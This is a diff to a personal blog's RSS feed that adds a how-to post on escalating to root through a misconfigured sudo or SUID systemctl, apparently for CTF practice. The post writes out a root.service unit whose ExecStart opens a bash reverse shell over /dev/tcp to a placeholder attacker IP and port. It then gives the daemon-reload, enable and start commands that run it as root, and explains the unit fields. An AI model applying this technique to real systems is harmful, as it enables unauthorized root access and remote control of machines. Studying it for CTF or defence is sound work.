@@ -6,7 +6,90 @@
         <description>Recent content on Tanishq Chaudhary</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Mon, 28 Jun 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://chaudhary1337.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sat, 03 Jul 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://chaudhary1337.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>How-to: systemctl misconfiguration exploit</title>
+        <link>https://chaudhary1337.github.io/p/how-to-systemctl-misconfiguration-exploit/</link>
+        <pubDate>Sat, 03 Jul 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://chaudhary1337.github.io/p/how-to-systemctl-misconfiguration-exploit/</guid>
+        <description>&lt;img src="https://i.imgur.com/ofnWIiq.png" alt="Featured image of post How-to: systemctl misconfiguration exploit" /&gt;&lt;h1 id=&#34;how-to-systemctl-sudosuid-exploit-explained&#34;&gt;How-to: systemctl sudo/suid Exploit Explained&lt;/h1&gt;
+&lt;h2 id=&#34;1-requirements&#34;&gt;1. Requirements&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Case 0&lt;/strong&gt;
+You have the permissions to run &lt;code&gt;/bin/systemctl&lt;/code&gt; as sudo or the SUID bit is set. This case is the easiest to deal with.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Case 1&lt;/strong&gt;
+Permissions (at least):&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;/bin/systemctl daemon-reload&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/bin/systemctl restart *.service&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Case 2&lt;/strong&gt;
+Permissions (at least):&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;/bin/systemctl daemon-reload&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/bin/systemctl enable *.service&lt;/code&gt; -&amp;gt; &lt;code&gt;/bin/systemctl start *.service&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;2-code&#34;&gt;2. Code&lt;/h2&gt;
+&lt;h3 id=&#34;case-0-and-case-1&#34;&gt;Case 0 and Case 1&lt;/h3&gt;
+&lt;p&gt;root.service&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[Unit]
+Description=pwn
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/your_ip/your_port 0&amp;gt;&amp;amp;1&#39;
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;case-0-and-case-2&#34;&gt;Case 0 and Case 2&lt;/h3&gt;
+&lt;p&gt;root.service&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[Unit]
+Description=pwn
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/your_ip/your_port 0&amp;gt;&amp;amp;1&#39;
+
+[Install]
+WantedBy=multi-user.target
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;3-exploiting&#34;&gt;3. Exploiting&lt;/h2&gt;
+&lt;h3 id=&#34;case-0-and-case-1-1&#34;&gt;Case 0 and Case 1&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;Edit/transfer the file &lt;code&gt;root.service&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Run &lt;code&gt;systemctl daemon-reload&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Run &lt;code&gt;systemctl restart root.service&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;case-0-and-case-2-1&#34;&gt;Case 0 and Case 2&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;Edit/transfer the file &lt;code&gt;root.service&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Run &lt;code&gt;systemctl daemon-reload&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Run &lt;code&gt;systemctl enable root.service&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Run &lt;code&gt;systemctl start root.service&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;4-explaination&#34;&gt;4. Explaination&lt;/h2&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;p&gt;The &lt;code&gt;root.service&lt;/code&gt; file that we create here is a &lt;code&gt;systemd.unit&lt;/code&gt; file, describing a service - that escalates us to root.&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;Type=simple&lt;/code&gt; specifies that after the &lt;code&gt;ExecStart=...&lt;/code&gt; process has been run, the unit is considered to be run successfully. The &lt;code&gt;User=root&lt;/code&gt; specifies that we are running the above process as root. This is allowed since we are priviledged enough to run systemctl commands as root :D&lt;/p&gt;
+&lt;p&gt;NOTE:
+The &lt;code&gt;WantedBy&lt;/code&gt; line is only required if you want to work with &lt;code&gt;systemctl enable&lt;/code&gt; command. That is, tell the system to load up this specific service while booting. Confused?&lt;/p&gt;
+&lt;p&gt;Here&amp;rsquo;s the thing. When we boot up a system, all the services having a &lt;code&gt;RequiredBy&lt;/code&gt; and &lt;code&gt;WantedBy&lt;/code&gt; are started up. Services not having them are not started. Think about it. The services that have dependencies are resolved. Those &lt;em&gt;not&lt;/em&gt; having this line are &lt;em&gt;not&lt;/em&gt; started simply because they are not &lt;strong&gt;required&lt;/strong&gt; or &lt;strong&gt;wanted&lt;/strong&gt; by anyone else. But, we are not rebooting the system during a CTF challenge. We can start this service manually - by using the &lt;code&gt;start&lt;/code&gt; command. Thus, there is &lt;strong&gt;no&lt;/strong&gt; need of the &lt;code&gt;WantedBy&lt;/code&gt; line!&lt;/p&gt;
+&lt;p&gt;Checkout the below error message if I do not include the &lt;code&gt;[Install] instructions&lt;/code&gt; and use the &lt;code&gt;enable&lt;/code&gt; command.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/etc/systemd/system]
+└─$ sudo systemctl enable root.service
+The unit files have no installation config (WantedBy=, RequiredBy=, Also=,
+Alias= settings in the [Install] section, and DefaultInstance= for template
+units). This means they are not meant to be enabled using systemctl.
+ 
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Thus, only if you want to use the enable command, include the &lt;code&gt;[Install]&lt;/code&gt; instructions. Else, its okay to skip!&lt;/p&gt;
+&lt;h2 id=&#34;5-references&#34;&gt;5. References&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://gtfobins.github.io/gtfobins/systemctl/&#34;&gt;https://gtfobins.github.io/gtfobins/systemctl/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://man7.org/linux/man-pages/man5/systemd.service.5.html&#34;&gt;https://man7.org/linux/man-pages/man5/systemd.service.5.html&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://man7.org/linux/man-pages/man1/systemctl.1.html&#34;&gt;https://man7.org/linux/man-pages/man1/systemctl.1.html&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://unix.stackexchange.com/questions/506347/why-do-most-systemd-examples-contain-wantedby-multi-user-target&#34;&gt;https://unix.stackexchange.com/questions/506347/why-do-most-systemd-examples-contain-wantedby-multi-user-target&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        <item>
         <title>TryHackMe: Anonforce Writeup</title>
         <link>https://chaudhary1337.github.io/p/tryhackme-anonforce-writeup/</link>
         <pubDate>Mon, 28 Jun 2021 00:00:00 +0000</pubDate>
